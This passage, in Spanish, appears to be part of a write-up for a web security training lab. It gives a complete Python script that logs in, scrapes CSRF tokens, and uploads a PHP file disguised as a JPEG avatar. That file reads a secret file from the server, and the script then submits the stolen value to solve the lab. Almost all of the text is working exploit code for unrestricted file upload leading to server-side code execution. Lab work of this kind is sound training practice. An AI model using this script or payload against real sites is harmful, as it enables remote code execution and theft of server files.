@@ -1,0 +1,105 @@
+2. **exploit.py**  
+   El script final que publicaste como exitoso (con reintentos para el timeout):
+
+```python
+import requests
+from bs4 import BeautifulSoup
+import time
+
+# Configuración inicial
+base_url = "https://0ada00ca04bc495f8154ee2f00120072.web-security-academy.net"
+login_url = f"{base_url}/login"
+account_url = f"{base_url}/my-account"
+upload_url = f"{base_url}/my-account/avatar"
+file_access_url = f"{base_url}/files/avatars/exploit.php"
+submit_url = f"{base_url}/submitSolution"
+
+# Credenciales
+username = "wiener"
+password = "peter"
+
+# Payload PHP para leer el secreto
+php_payload = "<?php echo file_get_contents('/home/carlos/secret'); ?>"
+
+# Headers para simular un navegador
+headers = {
+    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
+}
+
+# Iniciar sesión
+session = requests.Session()
+response = session.get(login_url, headers=headers)
+soup = BeautifulSoup(response.text, 'html.parser')
+csrf_input = soup.find('input', {'name': 'csrf'})
+if not csrf_input:
+    print("No se encontró el token CSRF en la página de login")
+    with open('login_page.html', 'w') as f:
+        f.write(response.text)
+    print("HTML guardado en 'login_page.html' para depuración")
+    exit()
+csrf_token = csrf_input.get('value')
+
+login_data = {
+    "username": username,
+    "password": password,
+    "csrf": csrf_token
+}
+response = session.post(login_url, data=login_data, headers=headers)
+if "My account" not in response.text:
+    print("Error al iniciar sesión")
+    exit()
+print("Sesión iniciada correctamente")
+
+# Obtener el formulario de carga desde /my-account
+response = session.get(account_url, headers=headers)
+soup = BeautifulSoup(response.text, 'html.parser')
+csrf_input = soup.find('input', {'name': 'csrf'})
+if not csrf_input:
+    print("No se encontró el token CSRF en la página de carga")
+    with open('upload_page.html', 'w') as f:
+        f.write(response.text)
+    print("HTML guardado en 'upload_page.html' para depuración")
+    exit()
+csrf_token = csrf_input.get('value')
+
+# Subir el archivo malicioso
+files = {
+    "avatar": ("exploit.php", php_payload, "image/jpeg")
+}
+upload_data = {
+    "csrf": csrf_token,
+    "user": "wiener"
+}
+response = session.post(upload_url, files=files, data=upload_data, headers=headers)
+if response.status_code != 200 or "exploit.php" not in response.text:
+    print("Error al subir el archivo")
+    with open('upload_response.html', 'w') as f:
+        f.write(response.text)
+    print("Respuesta guardada en 'upload_response.html' para depuración")
+    exit()
+print("Archivo subido correctamente")
+
+# Obtener el secreto
+response = session.get(file_access_url, headers=headers)
+secret = response.text.strip()
+print(f"Secreto obtenido: {secret}")
+
+# Enviar la solución con reintento
+submit_data = {
+    "answer": secret
+}
+for _ in range(3):
+    try:
+        response = session.post(submit_url, data=submit_data, headers=headers, timeout=10)
+        if "Congratulations" in response.text:
+            print("¡Laboratorio resuelto exitosamente!")
+            break
+        else:
+            print("Error al enviar el secreto")
+            print(response.text)
+            break
+    except requests.exceptions.RequestException as e:
+        print(f"Error al enviar: {e}")
+        time.sleep(2)
+else:
+    print("Falló tras 3 intentos")
